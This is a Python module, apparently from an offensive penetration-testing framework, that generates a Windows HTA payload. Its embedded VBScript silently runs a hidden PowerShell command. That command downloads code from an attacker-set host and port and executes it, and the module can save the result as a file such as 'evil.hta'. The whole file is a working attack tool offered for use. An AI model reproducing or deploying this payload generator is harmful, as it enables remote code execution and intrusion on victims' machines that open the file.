from core.module import BaseModule
from core.option import Option
from typing import Dict, Any

class Payload(BaseModule):
    Name = "windows/hta_reverse_tcp"
    Description = "HTA (HTML Application) Payload generating VBScript/PowerShell."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST": Option("LHOST", "127.0.0.1", True, "Dinleyen IP."),
            "LPORT": Option("LPORT", 4444, True, "Dinleyen Port."),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: evil.hta).", completion_dir=".")
        }

    def generate(self) -> str:
        lhost = self.get_option_value("LHOST")
        lport = self.get_option_value("LPORT")

        # Generate a simple PowerShell command to execute
        # In a real HTA, we'd embed this command to be run via VBScript or JScript WScript.Shell
        ps_command = f"powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/run')\""
        
        # HTA Template
        # This is a basic stub. Usually HTA payloads are more complex to evade detection.
        payload = f"""
<html>
<head>
<script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "{ps_command}", 0, True
    self.close
</script>
</head>
<body>
</body>
</html>
"""
        return payload.strip()

    def run(self, options: Dict[str, Any]):
        code = self.generate()
        
        output_path = self.get_option_value("OUTPUT")
        if output_path:
            if not output_path.endswith(".hta"):
                output_path += ".hta"

            try:
                with open(output_path, "w") as f:
                    f.write(code)
                print(f"[*] Payload başarıyla kaydedildi: {output_path}")
                return f"Payload saved to {output_path}"
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")
                return code

        print(f"[*] HTA Payload oluşturuldu ({len(code)} bytes):")
        print("-" * 50)
        print(code)
        print("-" * 50)
        return code
